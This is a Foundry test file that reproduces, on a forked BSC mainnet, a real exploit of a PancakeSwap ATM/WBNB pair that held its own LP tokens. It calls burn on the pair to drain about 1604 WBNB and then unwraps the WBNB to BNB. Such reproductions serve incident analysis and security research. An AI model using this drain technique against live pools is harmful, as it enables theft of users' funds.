// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// @KeyInfo - Total Lost : 1603.99 WBNB
// Attacker : 0x0eb4075c87ccd23a7ae1e00d77b043e4e8cc5894
// Attack Contract : 0x48b549e6b551c151bd392bb9acab1f88263adf48
// Vulnerable Contract : 0x9753a64fb7c233fdc43f04dab9cca88e1e229eba (PancakeSwap ATM/WBNB pair)
// Attack Tx : https://bscscan.com/tx/0x4e9f3dc3ce3c0a6aa19dae0f1384ff46e801b433b7e3bc4c780de486db6c950a

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x9753a64fb7c233fdc43f04dab9cca88e1e229eba#code

// @Analysis
// Twitter Guy :
//
// The ATM/WBNB PancakeSwap V2 pair held ~100% of its own LP supply: liquidity was "locked"
// by transferring the LP tokens to the pair contract itself (balanceOf(pair) == totalSupply
// minus the 1000-wei MINIMUM_LIQUIDITY). UniswapV2 burn(to) redeems the LP held by the pair
// and forwards the underlying reserves to `to`, so any unprivileged caller can burn the
// locked LP and drain the reserves. The attacker called burn once and walked away with the
// pair's entire ~1604 WBNB reserve, then unwrapped it to BNB.

address constant PAIR = 0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA;
address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakePair {
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
}

interface IWBNB {
    function balanceOf(address account) external view returns (uint256);
    function withdraw(uint256 wad) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 105_692_847;
        vm.createSelectFork("bsc", forkBlock);
        vm.deal(address(this), 0); // start from zero so the BNB balance reflects only stolen funds
        vm.label(PAIR, "ATM/WBNB Pair");
        vm.label(WBNB, "WBNB");
    }

    function testExploit() public balanceLog {
        // Reserve held by the pair before the drain; basis for the profit assertion.
        uint256 pairWbnbBefore = IERC20(WBNB).balanceOf(PAIR);

        // step 1: redeem the LP the pair holds against itself, draining its reserves to us.
        IPancakePair(PAIR).burn(address(this));

        // step 2: unwrap the stolen WBNB to native BNB (realized profit).
        IWBNB(WBNB).withdraw(IWBNB(WBNB).balanceOf(address(this)));

        // An unprivileged caller walked off with essentially the whole WBNB reserve.
        assertGt(address(this).balance, (pairWbnbBefore * 99) / 100);
    }

    receive() external payable {}
}
